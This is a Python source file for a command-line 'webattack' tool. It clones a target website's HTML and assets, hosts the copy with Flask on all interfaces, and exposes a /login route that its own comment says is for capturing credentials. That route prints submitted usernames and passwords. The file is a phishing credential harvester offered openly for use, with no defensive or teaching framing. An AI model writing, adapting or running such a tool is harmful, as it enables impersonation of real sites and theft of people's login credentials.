import os
import requests
from flask import Flask, request, render_template_string, send_from_directory
from bs4 import BeautifulSoup
import urllib.parse
import sys

app = Flask(__name__)

# Folder to store cloned assets (CSS, JS, images, etc.)
CLONE_DIR = 'cloned_assets'
if not os.path.exists(CLONE_DIR):
    os.makedirs(CLONE_DIR)

# Function to download resources like CSS, JS, and images
def download_asset(url, target_folder):
    try:
        # Get the content from the asset URL
        response = requests.get(url)
        if response.status_code == 200:
            # Get the filename from the URL
            asset_name = os.path.basename(urllib.parse.urlparse(url).path)
            # Save the asset to the local folder
            with open(os.path.join(target_folder, asset_name), 'wb') as f:
                f.write(response.content)
            return asset_name
    except requests.RequestException as e:
        print(f"Error downloading {url}: {e}")
    return None

# Function to clone a website (HTML and basic resources)
def clone_website(target_url):
    try:
        # Fetch the main HTML page
        response = requests.get(target_url)
        if response.status_code != 200:
            print(f"Failed to fetch {target_url}. Status code: {response.status_code}")
            return None

        # Parse the HTML of the target page
        soup = BeautifulSoup(response.text, 'html.parser')

        # Download assets like CSS, JS, and images
        for resource_tag in soup.find_all(['link', 'script', 'img']):
            if resource_tag.name == 'link' and resource_tag.get('rel') == ['stylesheet']:
                # Download the CSS files
                href = resource_tag.get('href')
                if href:
                    asset_path = download_asset(href, CLONE_DIR)
                    if asset_path:
                        resource_tag['href'] = f"/assets/{asset_path}"

            elif resource_tag.name == 'script' and resource_tag.get('src'):
                # Download the JS files
                src = resource_tag.get('src')
                if src:
                    asset_path = download_asset(src, CLONE_DIR)
                    if asset_path:
                        resource_tag['src'] = f"/assets/{asset_path}"

            elif resource_tag.name == 'img' and resource_tag.get('src'):
                # Download the image files
                src = resource_tag.get('src')
                if src:
                    asset_path = download_asset(src, CLONE_DIR)
                    if asset_path:
                        resource_tag['src'] = f"/assets/{asset_path}"

        # Return the modified HTML to serve
        return soup.prettify()

    except requests.RequestException as e:
        print(f"Error occurred while cloning {target_url}: {str(e)}")
        return None

# Flask route to serve the cloned website's HTML
@app.route('/')
def index():
    return render_template_string(cloned_page)

# Flask route to serve static assets (CSS, JS, images)
@app.route('/assets/<filename>')
def serve_asset(filename):
    return send_from_directory(CLONE_DIR, filename)

# Flask route to handle login form submission (for capturing credentials)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    print(f"Captured Credentials - Username: {username}, Password: {password}")
    return "Credentials received. Thank you!"

# Start the Flask web server
def start_flask_server():
    app.run(debug=True, host='0.0.0.0', port=5000)

# Main CLI loop
def main():
    while True:
        # Command prompt
        command = input("webattack > ").strip()

        # If command is 'clone', then clone the website
        if command.startswith("clone"):
            _, target_url = command.split(" ", 1)
            print(f"Cloning {target_url}...")
            
            # Clone the website
            global cloned_page
            cloned_page = clone_website(target_url)

            if cloned_page:
                print(f"Successfully cloned {target_url}. Hosting using Flask...")
                start_flask_server()
            else:
                print(f"Failed to clone {target_url}.")

        # Exit the program
        elif command == "exit":
            print("Exiting webattack CLI.")
            sys.exit()

        else:
            print("Invalid command. Use 'clone <target_url>' to clone a website.")

if __name__ == '__main__':
    main()
